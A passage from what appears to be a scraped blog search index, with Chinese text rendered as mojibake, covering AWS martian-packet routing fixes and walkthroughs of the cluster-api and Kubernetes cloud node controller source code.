seq 899903279, ack 2422028185, win 26847, options [mss 8961,sackOK,TS val 492512 ecr 149208343,nop,wscale 7], length 007:04:58.151092 IP 10.0.10.207.10250 &gt; 10.0.10.69.34924: Flags [S.], seq 899903279, ack 2422028185, win 26847, options [mss 8961,sackOK,TS val 492514 ecr 149208343,nop,wscale 7], length 007:04:58.267760 IP 10.0.10.207.10250 &gt; 10.0.10.69.34822: Flags [S.], seq 3998514543, ack 1418773910, win 26847, options [mss 8961,sackOK,TS val 492544 ecr 149204785,nop,wscale 7], length 007:04:58.907735 IP 10.0.10.207.10250 &gt; 10.0.10.69.34932: Flags [S.], seq 449930065, ack 724857165, win 26847, options [mss 8961,sackOK,TS val 492704 ecr 149208535,nop,wscale 7], length 0 123root@ip-10-0-10-207:/home/admin# ip rout get 10.0.10.69/2410.0.10.69 dev eth1 src 10.0.10.190 cache å‘ç°å‡ºç°æ¥å—æµé‡çš„æ˜¯ eth0, ä½†æ˜¯å‘é€çš„å“åº”çš„ eth1. å’¨è¯¢ç½‘ç»œåŒäº‹ï¼Œå‘ç°è¿™ä¸ªç°è±¡å·²ç»æœ‰ä¸“æœ‰è¯æ±‡äº†å«ç«æ˜ŸåŒ…, é…ç½®å†…æ ¸å‚æ•° 1234root@ip-10-0-10-207:/home/admin# sysctl -w net.ipv4.conf.all.log_martians=1net.ipv4.conf.all.log_martians = 1root@ip-10-0-10-207:/home/admin# sysctl -w net.ipv4.conf.default.log_martians=1net.ipv4.conf.default.log_martians = 1 å¯ä»¥çœ‹åˆ° kernel å·²ç»æ‰“å‡ºæ¥æ—¥å¿—äº†ã€‚ 12345678[ 5210.822567] ll header: 00000000: 02 00 ba 2b 02 3f 02 62 68 47 23 a1 08 00 ...+.?.bhG#...[ 5211.652509] IPv4: martian source 10.0.10.207 from 10.0.10.137, on dev eth0[ 5211.652547] ll header: 00000000: 02 00 ba 2b 02 3f 02 bd a6 b6 aa 3f 08 00 ...+.?.....?..[ 5211.830836] IPv4: martian source 10.0.10.115 from 10.0.0.224, on dev eth0[ 5211.830875] ll header: 00000000: 02 00 ba 2b 02 3f 02 bd a6 b6 aa 3f 08 00 ...+.?.....?..[ 5211.869305] IPv4: martian source 10.0.10.115 from 10.0.0.209, on dev eth0[ 5211.869338] ll header: 00000000: 02 00 ba 2b 02 3f 02 bd a6 b6 aa 3f 08 00 ...+.?.....?..[ 5232.836561] IPv4: host 10.0.10.115/if3 ignores redirects for 10.0.0.224 to 10.0.10.1 ç›®å‰çš„ä¿®å¤æ–¹æ¡ˆï¼Œå°†æ¥å“åº”è¯·æ±‚å’Œæ¥å—è¯·æ±‚é€šè¿‡ä¿®æ”¹è·¯ç”±è¡¨çš„æ–¹å¼éƒ½æ¢æˆ eth0. 123456root@ip-10-0-10-207:/home/admin# ip routedefault via 10.0.10.1 dev eth110.0.10.0/24 dev eth1 proto kernel scope link src 10.0.10.19010.0.10.0/24 dev eth0 proto kernel scope link src 10.0.10.207172.17.0.0/16 dev docker0 proto kernel scope link src 172.17.0.1 linkdownadmin@ip-10-0-10-207:~$ sudo ip route del 10.0.10.0/24 dev eth1 proto kernel scope link src 10.0.10.190 åªè¦å°† eth1 çš„æ˜ç»†è·¯ç”±åˆ é™¤ï¼Œå½±å“è·¯ç”±å†³ç­–è®©æ¥çš„æ•°æ®åŒ…èµ°åŸæ¥çš„ç½‘ç»œæ¥å£å›å»ã€‚ å½“ç„¶è¿˜æœ‰å…¶ä»–æ–¹æ¡ˆï¼Œæ¯”å¦‚è¯´åœ¨ AWS çš„ console ä¸Šå…³é—­ ec2 instance çš„æ¥æºåœ°å€æ£€æŸ¥ä¹Ÿå¯ä»¥ã€‚","tags":["k8s"]},{"title":"cluster api v1alpha2 ä¹‹ cluster","path":"/2019/10/20/cluster-api-v1alpha2-cluster/","content":"å› ä¸ºæœ€è¿‘å·¥ä½œéœ€è¦ï¼Œè°ƒç ”äº† cluster api provider aws.æ•´ç†è°ƒç ”è¿‡ç¨‹ä¸­çš„çŸ¥è¯†å¦‚ä¸‹ï¼š manager cluster æ˜¯ä¸€ä¸ªæ³¨å†Œäº†å¤šä¸ª crd å¹¶è¿è¡Œä¸‰ä¸ª controller çš„æ™®é€š k8s é›†ç¾¤ã€‚ ä¸‰ä¸ª controller åˆ†åˆ«æ˜¯ï¼šcabpk-controller-manager æ ¸å¿ƒåŠŸèƒ½æ˜¯ç”¨æ¥ç”Ÿäº§é›†ç¾¤è¯ä¹¦ç»Ÿä¸€ç­¾å‘ï¼Œæ ¸å¿ƒè¿›ç¨‹çš„å‚æ•°ä¸‹å‘ã€‚capa-controller-manager æ ¸å¿ƒåŠŸèƒ½æ˜¯å’Œ aws æ²Ÿé€šï¼Œè´Ÿè´£ CRUD äº‘ä¸Šèµ„æºã€‚capi-controller-manager æ ¸å¿ƒåŠŸèƒ½æ˜¯ç¡®å®š cluster api group å’Œé›†ç¾¤å…¬ç”¨èµ„æºã€‚ ç”¨æˆ·é€šè¿‡ CAPA è„šæœ¬æ¸²æŸ“ specç›®å‰ cluster api ä½¿ç”¨è¿‡ shell è„šæœ¬æ¸²æŸ“å‡ºåŸºæœ¬çš„é›†ç¾¤æ¨¡ç‰ˆæ–‡ä»¶ï¼Œå¹¶ç”±ç”¨æˆ·ä¸»åŠ¨å‘é€çš„åˆ° manager cluster ä¸­ã€‚æ¸²æŸ“å‡ºçš„ cluster èµ„æºå¦‚ä¸‹ï¼Œçœ‹åˆ° api version æ˜¯ v1alpha2 , ä¸‹é¢æ”¯æŒ amazon cni æ˜¯è‡ªå·±é€‚é…å¼€å‘çš„ã€‚cluster crd ç”± capi-controller-manager ä¸­çš„ cluster è´Ÿè´£è°ƒåå·¥ä½œã€‚ 12345678910111213141516171819apiVersion: cluster.x-k8s.io/v1alpha2kind: Clustermetadata: annotations: cluster.k8s.io/network-cni: AmazonVPC name: testnetwork3spec: clusterNetwork: pods: cidrBlocks: - 10.66.0.0/24 services: cidrBlocks: - 192.168.0.0/16 infrastructureRef: apiVersion: infrastructure.cluster.x-k8s.io/v1alpha2 kind: AWSCluster name: testnetwork3 namespace: default æ¸²æŸ“å‡ºçš„ awscluster èµ„æºå¦‚ä¸‹ï¼Œå£°æ˜å¼çš„å‘Šè¯‰è¿›è¡Œ capa-controller-manager ä¸­çš„ awscluster controller è¿›è¡Œè°ƒå æ—¶è¦æŒ‰ç…§ yaml é‡Œé¢æè¿°åˆ›å»ºå­ç½‘ä¿¡æ¯ã€‚ ä¹‹æ‰€ä»¥è¦åˆ›å»º 6 ä¸ªå­ç½‘æ˜¯è®¡åˆ’é€šè¿‡ aws æ¥æŠ•æ”¾ HA çš„ kubernetes é›†ç¾¤ï¼Œæ¯ä¸ªåŒºåŸŸæ”¾ä¸€ä¸ª master apiserver. 123456789101112131415161718192021222324252627282930apiVersion: infrastructure.cluster.x-k8s.io/v1alpha2kind: AWSClustermetadata: name: testnetwork3 namespace: defaultspec: networkSpec: subnets: - availabilityZone: us-east-2a cidrBlock: 10.66.0.0/27 isPublic: true - availabilityZone: us-east-2a cidrBlock: 10.66.0.32/27 isPublic: false - availabilityZone: us-east-2b cidrBlock: 10.66.0.64/27 isPublic: true - availabilityZone: us-east-2b cidrBlock: 10.66.0.96/27 isPublic: false - availabilityZone: us-east-2c cidrBlock: 10.66.0.128/27 isPublic: true - availabilityZone: us-east-2c cidrBlock: 10.66.0.160/27 isPublic: false vpc: cidrBlock: 10.66.0.0/24 region: us-east-2 sshKeyName: guohao ä¸Šé¢ä¸¤ä¸ªæ–‡ä»¶å’Œåœ¨ä¸€èµ·å°±æ˜¯ CAPA å®˜æ–¹çš„æ¸²æŸ“è„šæœ¬è¾“å‡ºçš„ cluster.yaml æ–‡ä»¶çš„å…¨éƒ¨å†…å®¹äº†ï¼Œè™½ç„¶æ˜¯ä¸€ä¸ªæ–‡ä»¶ 2 ä¸ª yaml, ä½†æ˜¯ç¡®æ¶‰åŠåˆ°äº† 2 ä¸ª controller manager ä¸­çš„ awscluster controller å’Œ cluster controller. cluster controller å¦‚ä½•å·¥ä½œçš„åœ¨ capa ä¸­ cluster controller ä¸èƒ½ç‹¬ç«‹ä¸ awscluster controller å·¥ä½œï¼Œä¸¤ä¸ªç»„å»ºä¹‹é—´çš„åä½œæµç¨‹å¦‚ä¸‹å›¾ã€‚ cluster-controller-and-awscluster-controller Figure 1 presents the sequence of actions involved in provisioning a cluster, highlighting the coordination required between the CAPI cluster controller and the provider infrastructure controller. The creation of the Cluster and provider infrastructure objects are independent events. It is expected that the cluster infrastructure object to be created before the cluster object and the reference be set to in the cluster object at creation time. When a provider infrastructure object is created, the providerâ€™s controller will do nothing unless its owner reference is set to a cluster object. When the cluster object is created, the cluster controller will retrieve the infrastructure object. If the object has not been seen before, it will start watching it. Also, if the objectâ€™s owner is not set, it will set to the Cluster object. When an infrastructure object is updated, the provider controller will check the owner reference. If it is set, it will retrieve the cluster object to obtain the required cluster specification and starts the provisioning process. When the process finishes, it sets the Infrastructure.Status.Ready to true. When the cluster controller detects the Infrastructure.Status.Ready is set to true, it updates Cluster.Status.APIEndpoints from Infrastructure.Status.APIEndpoints and sets Cluster.Status.InfrastructureReady to true. ä¸Šè¿°æµç¨‹è¿˜æ˜¯æ¯”è¾ƒæ˜äº†çš„ã€‚ cluster controller å®ç°ç›®å‰ controller çš„å¼€å‘éƒ½æ˜¯ä½¿ç”¨äº† kubebuilder é‚£ä¸€å¥—è„šæ‰‹æ¶äº†ï¼Œcontroller å¼€å‘æ¨¡å¼ç›´æ¥å¤§åŒå°å¼‚äº†ã€‚æ ¸å¿ƒå°±æ˜¯ä¸€ä¸ªå‡½æ•° reconcile . æ ¸å¿ƒå‡½æ•°çš„æ ¸å¿ƒé€»è¾‘ä»£ç å¦‚ä¸‹ï¼Œä¸‰ä¸ªå­èµ„æºçš„ reconcile, cluster controller æ•´ä¸ªæµç¨‹å¹¶æ²¡æœ‰å®é™…åˆ›å»ºä»€ä¹ˆä¸œè¥¿ï¼Œä»…ä»…æ˜¯å¯¹è´¦ä¿¡æ¯ï¼Œç»„è£…æµç¨‹ã€‚ 1234567891011// reconcile handles cluster reconciliation.func (r *ClusterReconciler) reconcile(ctx context.Context, cluster *clusterv1.Cluster) (ctrl.Result, error) &#123;...\t// Call the inner reconciliation methods.\treconciliationErrors := []error&#123; r.reconcileInfrastructure(ctx, cluster), r.reconcileKubeconfig(ctx, cluster), r.reconcileControlPlaneInitialized(ctx, cluster),\t&#125;...&#125; reconcileInfrastructure çš„å®ç°å°±åƒä¹‹å‰æè®®é‡Œé¢æè¿°ä¸€æ ·ï¼Œå› ä¸ºå¹¶ä¸æ¶‰åŠåˆ°å®é™…çš„èµ„æºåˆ›å»ºã€‚åªæ˜¯ä» awscluster çš„ yaml ä¸­è·å– infrastructure å’Œ apiserver endpoint ä¿¡æ¯ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344// reconcileInfrastructure reconciles the Spec.InfrastructureRef object on a Cluster.func (r *ClusterReconciler) reconcileInfrastructure(ctx context.Context, cluster *clusterv1.Cluster) error &#123;\tlogger := r.Log.WithValues(&quot;cluster&quot;, cluster.Name, &quot;namespace&quot;, cluster.Namespace)\tif cluster.Spec.InfrastructureRef == nil &#123; return nil\t&#125;\t// Call generic external reconciler.\tinfraConfig, err := r.reconcileExternal(ctx, cluster, cluster.Spec.InfrastructureRef)\tif err != nil &#123; return err\t&#125;\t// There&#x27;s no need to go any further if the Cluster is marked for deletion.\tif !infraConfig.GetDeletionTimestamp().IsZero() &#123; return nil\t&#125;\t// Determine if the infrastructure provider is ready.\tif !cluster.Status.InfrastructureReady &#123; ready, err := external.IsReady(infraConfig) if err != nil &#123; return err &#125; else if !ready &#123; logger.V(3).Info(&quot;Infrastructure provider is not ready yet&quot;) return nil &#125; cluster.Status.InfrastructureReady = true\t&#125;\t// Get and parse Status.APIEndpoint field from the infrastructure provider.\tif len(cluster.Status.APIEndpoints) == 0 &#123; if err := util.UnstructuredUnmarshalField(infraConfig, &amp;cluster.Status.APIEndpoints, &quot;status&quot;, &quot;apiEndpoints&quot;); err != nil &#123; return errors.Wrapf(err, &quot;failed to retrieve Status.APIEndpoints from infrastructure provider for Cluster %q in namespace %q&quot;, cluster.Name, cluster.Namespace) &#125; else if len(cluster.Status.APIEndpoints) == 0 &#123; return errors.Wrapf(err, &quot;retrieved empty Status.APIEndpoints from infrastructure provider for Cluster %q in namespace %q&quot;, cluster.Name, cluster.Namespace) &#125;\t&#125;\treturn nil&#125; kubeconfig çš„ä¿¡æ¯å¯¹è´¦ï¼Œå¦‚æœæ²¡æœ‰æœ‰ç°æˆçš„ kubeconfig é‚£å°±åˆ›å»ºä¸€ä¸ªç°æˆçš„ï¼Œé™„ä¸Šä¸€ä¸ªä» manager cluster ä¸­è·å– kubeconfig çš„æŒ‡ä»¤ã€‚ 1kubectl --namespace=default get secret $CLUSTER_NAME-kubeconfig -o json | jq -r .data.value | base64 --decode &gt; $CLUSTER_NAME-kubeconfig 1234567891011121314func (r *ClusterReconciler) reconcileKubeconfig(ctx context.Context, cluster *clusterv1.Cluster) error &#123;\tif len(cluster.Status.APIEndpoints) == 0 &#123; return nil\t&#125;\t_, err := secret.Get(r.Client, cluster, secret.Kubeconfig)\tswitch &#123;\tcase apierrors.IsNotFound(err): if err := kubeconfig.CreateSecret(ctx, r.Client, cluster); err != nil &#123;...\treturn nil&#125; å¦‚æœæœ‰ä¸€ä¸ª master èŠ‚ç‚¹æ˜¯åˆå§‹åŒ–å®Œæˆï¼Œè¿™ä¸ªå‡½æ•°å°±ä¸ä¼šå‘ç”Ÿä»»ä½•é”™è¯¯ã€‚ 12345678910111213141516171819202122func (r *ClusterReconciler) reconcileControlPlaneInitialized(ctx context.Context, cluster *clusterv1.Cluster) error &#123;\tlogger := r.Log.WithValues(&quot;cluster&quot;, cluster.Name, &quot;namespace&quot;, cluster.Namespace)\tif cluster.Status.ControlPlaneInitialized &#123; return nil\t&#125;\tmachines, err := getActiveMachinesInCluster(ctx, r.Client, cluster.Namespace, cluster.Name)\tif err != nil &#123; logger.Error(err, &quot;Error getting machines in cluster&quot;) return err\t&#125;\tfor _, m := range machines &#123; if util.IsControlPlaneMachine(m) &amp;&amp; m.Status.NodeRef != nil &#123; cluster.Status.ControlPlaneInitialized = true return nil &#125;\t&#125;\treturn nil&#125; awscluster controller å¦‚ä½•å·¥ä½œçš„ä¸‹é¢å°±æ˜¯ aws cluster controller çš„æ ¸å¿ƒé€»è¾‘ 123456789101112131415161718192021222324252627282930313233343536373839404142434445// TODO(ncdc): should this be a function on ClusterScope?func reconcileNormal(clusterScope *scope.ClusterScope) (reconcile.Result, error) &#123;\tclusterScope.Info(&quot;Reconciling AWSCluster&quot;)\tawsCluster := clusterScope.AWSCluster\t// If the AWSCluster doesn&#x27;t have our finalizer, add it.\tif !util.Contains(awsCluster.Finalizers, infrav1.ClusterFinalizer) &#123; awsCluster.Finalizers = append(awsCluster.Finalizers, infrav1.ClusterFinalizer)\t&#125;\tec2Service := ec2.NewService(clusterScope)\telbService := elb.NewService(clusterScope)\tif err := ec2Service.ReconcileNetwork(); err != nil &#123; // åŸºç¡€ç½‘ç»œç»„ç½‘ return reconcile.Result&#123;&#125;, errors.Wrapf(err, &quot;failed to reconcile network for AWSCluster %s/%s&quot;, awsCluster.Namespace, awsCluster.Name)\t&#125;\tif err := ec2Service.ReconcileBastion(); err != nil &#123; // vpc è·³æ¿æœºçš„åˆ›å»º return reconcile.Result&#123;&#125;, errors.Wrapf(err, &quot;failed to reconcile bastion host for AWSCluster %s/%s&quot;, awsCluster.Namespace, awsCluster.Name)\t&#125;\tif err := elbService.ReconcileLoadbalancers(); err != nil &#123; // apiserver çš„ lb åˆ›å»º return reconcile.Result&#123;&#125;, errors.Wrapf(err, &quot;failed to reconcile load balancers for AWSCluster %s/%s&quot;, awsCluster.Namespace, awsCluster.Name)\t&#125;\tif awsCluster.Status.Network.APIServerELB.DNSName == &quot;&quot; &#123; clusterScope.Info(&quot;Waiting on API server ELB DNS name&quot;) return reconcile.Result&#123;RequeueAfter: 15 * time.Second&#125;, nil\t&#125;\t// Set APIEndpoints so the Cluster API Cluster Controller can pull them\t// TODO: should we get the Port from the first listener on the ELB?\tawsCluster.Status.APIEndpoints = []infrav1.APIEndpoint&#123; &#123; Host: awsCluster.Status.Network.APIServerELB.DNSName, Port: int(clusterScope.APIServerPort()), &#125;,\t&#125;\t// No errors, so mark us ready so the Cluster API Cluster Controller can pull it\tawsCluster.Status.Ready = true\treturn reconcile.Result&#123;&#125;, nil&#125; ReconcileNetwork å°±æ˜¯åŸºç¡€ç»„ç½‘çš„é€»è¾‘ï¼Œè¿™ä¸ªé€»è¾‘ä¼šæŒ‰ç…§ä½ ä¼ å…¥çš„ network ä¿¡æ¯è¿›è¡Œæœ€åŸºæœ¬çš„ vpc åˆ›å»ºï¼Œå®šåˆ¶åŒ–çš„ subnet åˆ›å»ºã€‚ 123456789101112131415161718192021222324252627282930313233343536func (s *Service) ReconcileNetwork() (err error) &#123;\ts.scope.V(2).Info(&quot;Reconciling network for cluster&quot;, &quot;cluster-name&quot;, s.scope.Cluster.Name, &quot;cluster-namespace&quot;, s.scope.Cluster.Namespace)\t// VPC.\tif err := s.reconcileVPC(); err != nil &#123; return err\t&#125;\t// Subnets.\tif err := s.reconcileSubnets(); err != nil &#123; return err\t&#125;\t// Internet Gateways.\tif err := s.reconcileInternetGateways(); err != nil &#123; return err\t&#125;\t// NAT Gateways.\tif err := s.reconcileNatGateways(); err != nil &#123; // è¿™é‡Œæœ‰ç‚¹é—®é¢˜ï¼ŒæŒ‰ç…§æˆ‘ä¹‹å‰ spec æè¿°å°±ä¼šåˆ›å»ºå‡ºä¸‰ä¸ª NATGW, æœ‰ç‚¹æµªè´¹äº†ã€‚ return err\t&#125;\t// Routing tables.\tif err := s.reconcileRouteTables(); err != nil &#123; return err\t&#125;\t// Security groups.\tif err := s.reconcileSecurityGroups(); err != nil &#123; return err\t&#125;\ts.scope.V(2).Info(&quot;Reconcile network completed successfully&quot;)\treturn nil&#125; å…¶ä½™ä¸¤ä¸ªæµç¨‹è¿‡äºç®€å•å°±ä¸å•ç‹¬æ¦‚è¿°äº†ï¼Œè‡ªè¡Œæµè§ˆä»£ç å³å¯ã€‚","tags":["k8s"]},{"title":"cloud provider node controller","path":"/2019/04/02/cloud-provider-node-controller/","content":"node controller æ˜¯è´Ÿè´£åˆå§‹åŒ–&#x2F;ç»´æŠ¤ä¸€ä¸ªk8s node åœ¨äº‘ä¸Šæ ‡è¯†çš„ä¿¡æ¯ï¼Œä¸»è¦ä¿¡æ¯å¦‚ä¸‹ï¼š 1: åˆå§‹åŒ–nodeçš„äº‘ç›¸å…³çš„zone&#x2F;regionä¿¡æ¯labelsã€‚2: åˆå§‹åŒ– node çš„äº‘ä¸Šçš„å®ä¾‹ä¿¡æ¯ï¼Œæ¯”å¦‚è¯´ type å’Œ szieã€‚3: è·å– node çš„ç½‘ç»œåœ°å€ä¿¡æ¯å’Œä¸»æœºåç§°ã€‚4: å½“å®¢æˆ·é€šè¿‡äº‘çš„è™šæ‹Ÿæœºç®¡ç†é¢æ¿åˆ é™¤ä¸»æœºçš„æ—¶å€™éœ€è¦ä» k8s ä¸­åŒæ­¥çš„åˆ é™¤ nodeã€‚ åœ¨å®ç°ä¸Š cloud node controllr æ ¸å¿ƒé€»è¾‘åªæ˜¯é‡åº¦ä¾èµ– cloud æ¥å£ å’Œ node Informersã€‚ 12345678910111213// startControllers starts the cloud specific controller loops.func startControllers(c *cloudcontrollerconfig.CompletedConfig, stop &lt;-chan struct&#123;&#125;, cloud cloudprovider.Interface) error &#123;... // Start the CloudNodeController nodeController := cloudcontrollers.NewCloudNodeController( c.SharedInformers.Core().V1().Nodes(), client(&quot;cloud-node-controller&quot;), cloud, c.ComponentConfig.KubeCloudShared.NodeMonitorPeriod.Duration, c.ComponentConfig.NodeStatusUpdateFrequency.Duration) nodeController.Run(stop)...&#125; node controller å®ç°æœ€å¼€å§‹æè¿° 4 ä¸ªéœ€æ±‚åªæœ‰ä¸¤å—æ ¸å¿ƒé€»è¾‘ï¼š å…¶ä¸€æ˜¯å‘¨æœŸæ€§ä¸æ–­æ‰§è¡Œçš„UpdateNodeStatuså’ŒMonitorNodeï¼Œå‰è€…æ˜¯æ›´æ–°èŠ‚ç‚¹çŠ¶æ€æ¯”å¦‚ ip åœ°å€ï¼Œåè€…é€šè¿‡äº‘å¹³å°ç®¡ç†æ¥å£ç›‘æ§è™šæ‹Ÿæœºï¼Œå½“å®¢æˆ·é€šè¿‡è™šæ‹Ÿæœºç®¡ç†é¡µé¢ç§»é™¤æœºå™¨æ—¶å€™ä¿è¯ k8s ä¸­ node ä¹Ÿä¼šè¢«åˆ é™¤ã€‚ å…¶äºŒæ˜¯é€šè¿‡ controller æœºåˆ¶æ¥è§¦å‘çš„ä¸¤ä¸ªå›è°ƒå‡½æ•°AddCloudNodeå’ŒUpdateCloudNodeæ·»åŠ è™šæ‹Ÿæœºä¸äº‘ç›¸å…³æ ‡ç­¾æ¯”å¦‚å®ä¾‹ç±»å‹x2.largetå®ä¾‹ Idins-xxxè¿˜æœ‰ ip åœ°å€ç­‰ã€‚ 1234567891011121314151617// NewCloudNodeController creates a CloudNodeController objectfunc NewCloudNodeController( nodeInformer coreinformers.NodeInformer, kubeClient clientset.Interface, cloud cloudprovider.Interface, nodeMonitorPeriod time.Duration, nodeStatusUpdateFrequency time.Duration) *CloudNodeController &#123;... // Use shared informer to listen to add/update of nodes. Note that any nodes // that exist before node controller starts will show up in the update method cnc.nodeInformer.Informer().AddEventHandler(cache.ResourceEventHandlerFuncs&#123; AddFunc: cnc.AddCloudNode, UpdateFunc: cnc.UpdateCloudNode, &#125;) return cnc&#125; cloud node controller ç¬¬ä¸€å—é€»è¾‘ï¼šåœ¨å®ç°ä¸Š cloud node controller ä»…ä»…æ³¨å†Œäº† 2 ä¸ªå›è°ƒå‡½æ•°ï¼Œè€Œä¸”åœ¨å®ç°ä¸Š UpdateCloudNode è°ƒç”¨äº† AddCloudNodeã€‚ 1234567func (cnc *CloudNodeController) UpdateCloudNode(_, newObj interface&#123;&#125;) &#123;\tif _, ok := newObj.(*v1.Node); !ok &#123; utilruntime.HandleError(fmt.Errorf(&quot;unexpected object type: %v&quot;, newObj)) return\t&#125;\tcnc.AddCloudNode(newObj)&#125; å¯ä»¥çœ‹ä¸€ä¸‹ AddCloudNode å®ç°ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980// This processes nodes that were added into the cluster, and cloud initialize them if appropriatefunc (cnc *CloudNodeController) AddCloudNode(obj interface&#123;&#125;) &#123;\tnode := obj.(*v1.Node)// è¿™é‡Œä¸€ä¸ªåˆ¤æ–­æ˜¯å¦è¦è¿›å…¥ cloud node controller çš„åˆå§‹åŒ–æµç¨‹\tcloudTaint := getCloudTaint(node.Spec.Taints)\tif cloudTaint == nil &#123; glog.V(2).Infof(&quot;This node %s is registered without the cloud taint. Will not process.&quot;, node.Name) return\t&#125;...\terr := clientretry.RetryOnConflict(UpdateNodeSpecBackoff, func() error &#123;// ç§»é™¤äº† gce ç‰¹æœ‰é€»è¾‘... curNode, err := cnc.kubeClient.CoreV1().Nodes().Get(node.Name, metav1.GetOptions&#123;&#125;) if err != nil &#123; return err &#125;// å°è¯•å¡«è¡¥ node spec provider:// å­—æ®µ if curNode.Spec.ProviderID == &quot;&quot; &#123; providerID, err := cloudprovider.GetInstanceProviderID(context.TODO(), cnc.cloud, types.NodeName(curNode.Name)) if err == nil &#123; curNode.Spec.ProviderID = providerID &#125; ... &#125; nodeAddresses, err := getNodeAddressesByProviderIDOrName(instances, curNode) if err != nil &#123; return err &#125; // If user provided an IP address, ensure that IP address is found // in the cloud provider before removing the taint on the node if nodeIP, ok := ensureNodeProvidedIPExists(curNode, nodeAddresses); ok &#123; if nodeIP == nil &#123; return errors.New(&quot;failed to find kubelet node IP from cloud provider&quot;) &#125; &#125; if instanceType, err := getInstanceTypeByProviderIDOrName(instances, curNode); err != nil &#123; return err &#125; else if instanceType != &quot;&quot; &#123; glog.V(2).Infof(&quot;Adding node label from cloud provider: %s=%s&quot;, kubeletapis.LabelInstanceType, instanceType) // åœ¨ instance spec æ·»åŠ  instance type curNode.ObjectMeta.Labels[kubeletapis.LabelInstanceType] = instanceType &#125; if zones, ok := cnc.cloud.Zones(); ok &#123; zone, err := getZoneByProviderIDOrName(zones, curNode) if err != nil &#123; return fmt.Errorf(&quot;failed to get zone from cloud provider: %v&quot;, err) &#125; if zone.FailureDomain != &quot;&quot; &#123; glog.V(2).Infof(&quot;Adding node label from cloud provider: %s=%s&quot;, kubeletapis.LabelZoneFailureDomain, zone.FailureDomain) // åœ¨ instance spec ä¸­å‡†å¤‡ zone ä¿¡æ¯ curNode.ObjectMeta.Labels[kubeletapis.LabelZoneFailureDomain] = zone.FailureDomain &#125; if zone.Region != &quot;&quot; &#123; glog.V(2).Infof(&quot;Adding node label from cloud provider: %s=%s&quot;, kubeletapis.LabelZoneRegion, zone.Region) curNode.ObjectMeta.Labels[kubeletapis.LabelZoneRegion] = zone.Region &#125; &#125; curNode.Spec.Taints = excludeTaintFromList(curNode.Spec.Taints, *cloudTaint) // å»æ›´æ–° node spec _, err = cnc.kubeClient.CoreV1().Nodes().Update(curNode) if err != nil &#123; return err &#125; // After adding, call UpdateNodeAddress to set the CloudProvider provided IPAddresses // So that users do not see any significant delay in IP addresses being filled into the node cnc.updateNodeAddress(curNode, instances) return nil\t&#125;)...\tglog.Infof(&quot;Successfully initialized node %s with cloud provider&quot;, node.Name)&#125; cloud node controller ç¬¬äºŒå—é€»è¾‘ï¼šå‘¨æœŸæ€§è°ƒç”¨UpdateNodeStatuså’ŒMonitorNodeã€‚ 123456789101112131415// This controller deletes a node if kubelet is not reporting// and the node is gone from the cloud provider.func (cnc *CloudNodeController) Run(stopCh &lt;-chan struct&#123;&#125;) &#123; defer utilruntime.HandleCrash() // The following loops run communicate with the APIServer with a worst case complexity // of O(num_nodes) per cycle. These functions are justified here because these events fire // very infrequently. DO NOT MODIFY this to perform frequent operations. // Start a loop to periodically update the node addresses obtained from the cloud go wait.Until(cnc.UpdateNodeStatus, cnc.nodeStatusUpdateFrequency, stopCh) // Start a loop to periodically check if any nodes have been deleted from cloudprovider go wait.Until(cnc.MonitorNode, cnc.nodeMonitorPeriod, stopCh)&#125; UpdateNodeStatusçš„å®ç°æ›´æ–°äº†ip addressã€‚ 123456789101112131415// UpdateNodeStatus updates the node status, such as node addressesfunc (cnc *CloudNodeController) UpdateNodeStatus() &#123; instances, ok := cnc.cloud.Instances()... nodes, err := cnc.kubeClient.CoreV1().Nodes().List(metav1.ListOptions&#123;ResourceVersion: &quot;0&quot;&#125;) if err != nil &#123; glog.Errorf(&quot;Error monitoring node status: %v&quot;, err) return &#125; for i := range nodes.Items &#123; cnc.updateNodeAddress(&amp;nodes.Items[i], instances) &#125;&#125; MonitorNode å‡½æ•°ä¹Ÿæ˜¯å‘¨æœŸæ€§æ‰§è¡Œï¼Œå½“è°ƒç”¨ cloud provider å‘ç°èŠ‚ç‚¹ä¸å­˜åœ¨çš„æ—¶å€™ä¹Ÿä¼šä» k8s ä¸­ç§»é™¤èŠ‚ç‚¹ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697// Monitor node queries the cloudprovider for non-ready nodes and deletes them// if they cannot be found in the cloud providerfunc (cnc *CloudNodeController) MonitorNode() &#123;...\tnodes, err := cnc.kubeClient.CoreV1().Nodes().List(metav1.ListOptions&#123;ResourceVersion: &quot;0&quot;&#125;)\tif err != nil &#123; glog.Errorf(&quot;Error monitoring node status: %v&quot;, err) return\t&#125;\tfor i := range nodes.Items &#123; var currentReadyCondition *v1.NodeCondition node := &amp;nodes.Items[i] // Try to get the current node status // If node status is empty, then kubelet has not posted ready status yet. In this case, process next node for rep := 0; rep &lt; nodeStatusUpdateRetry; rep++ &#123; _, currentReadyCondition = nodeutilv1.GetNodeCondition(&amp;node.Status, v1.NodeReady) if currentReadyCondition != nil &#123; break &#125; name := node.Name node, err = cnc.kubeClient.CoreV1().Nodes().Get(name, metav1.GetOptions&#123;&#125;) if err != nil &#123; glog.Errorf(&quot;Failed while getting a Node to retry updating NodeStatus. Probably Node %s was deleted.&quot;, name) break &#125; time.Sleep(retrySleepTime) &#125; if currentReadyCondition == nil &#123; glog.Errorf(&quot;Update status of Node %v from CloudNodeController exceeds retry count or the Node was deleted.&quot;, node.Name) continue &#125; // If the known node status says that Node is NotReady, then check if the node has been removed // from the cloud provider. If node cannot be found in cloudprovider, then delete the node immediately if currentReadyCondition != nil &#123; if currentReadyCondition.Status != v1.ConditionTrue &#123; // we need to check this first to get taint working in similar in all cloudproviders // current problem is that shutdown nodes are not working in similar way ie. all cloudproviders // does not delete node from kubernetes cluster when instance it is shutdown see issue #46442 shutdown, err := nodectrlutil.ShutdownInCloudProvider(context.TODO(), cnc.cloud, node) if err != nil &#123; glog.Errorf(&quot;Error checking if node %s is shutdown: %v&quot;, node.Name, err) &#125; if shutdown &amp;&amp; err == nil &#123; // if node is shutdown add shutdown taint err = controller.AddOrUpdateTaintOnNode(cnc.kubeClient, node.Name, controller.ShutdownTaint) if err != nil &#123; glog.Errorf(&quot;Error patching node taints: %v&quot;, err) &#125; // Continue checking the remaining nodes since the current one is shutdown. continue &#125; // Check with the cloud provider to see if the node still exists. If it // doesn&#x27;t, delete the node immediately. exists, err := ensureNodeExistsByProviderID(instances, node) if err != nil &#123; glog.Errorf(&quot;Error checking if node %s exists: 